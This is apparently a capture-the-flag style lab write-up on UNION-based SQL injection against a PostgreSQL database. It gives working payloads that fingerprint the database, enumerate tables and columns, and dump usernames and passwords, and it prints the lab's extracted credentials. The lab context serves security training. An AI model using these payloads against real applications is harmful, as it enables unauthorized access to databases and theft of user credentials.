# Lab: SQL injection attack, listing the database contents on non-Oracle databases
## Description

1) Found a working SQLi using `'+UNION+SELECT+NULL,NULL--`
2) Identify column types (both strings) `'+UNION+SELECT+'hello','world'--`
3) Identify the database type
```
'+UNION+SELECT+'hello',%40%40version-- 			<-- FAILED, its not MSSQL
'+UNION+SELECT+'hello',version()--				<-- SUCCESS, its Postgres
```
4) Find table names in the DB `'+UNION+SELECT+TABLE_NAME,NULL+FROM+information_schema.tables--`. Found the following table name in the output:
```
users_pzsprq
```

5) Find columns in `users_pzsprq` table: `'+UNION+SELECT+COLUMN_NAME,NULL+FROM+information_schema.columns+where+table_name+%3d+'users_pzsprq'--`. Found the following table name in the output:
```
password_bdcaus
username_bwzjzf
```
6) Extract credentials `'+UNION+SELECT+username_bwzjzf,password_bdcaus+from+users_pzsprq--`
```
carlos
peexl4hhedzuwjl5n7v0
administrator
993r3uz4uehpxt5h9rfw
wiener
9kj4vaceasdhcfubh8q2
```

## Solution
1) Find table names in the DB `'+UNION+SELECT+TABLE_NAME,NULL+FROM+information_schema.tables--`
2) Find columns in `users_XXXXX` table: `'+UNION+SELECT+COLUMN_NAME,NULL+FROM+information_schema.columns+where+table_name+%3d+'users_XXXXX'--`. 
3) Extract credentials `'+UNION+SELECT+username_YYYYYY,password_ZZZZZZ+from+users_XXXXX--`
4) Login as Administrator